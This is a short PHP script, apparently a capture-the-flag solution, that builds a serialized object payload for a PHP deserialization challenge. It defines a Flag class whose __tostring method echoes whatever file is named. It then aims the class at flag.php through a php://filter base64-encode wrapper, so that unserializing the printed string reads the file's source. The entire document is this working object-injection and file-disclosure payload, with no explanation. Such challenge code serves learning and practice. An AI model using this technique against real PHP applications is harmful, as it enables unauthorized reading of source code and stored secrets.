<?php  
  
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
			echo "<br>";
		return ("good");
        }  
    }  
} 
$aa=new Flag();
$aa->file="php://filter/convert.base64-encode/resource=flag.php";
print_r(serialize($aa));
?>  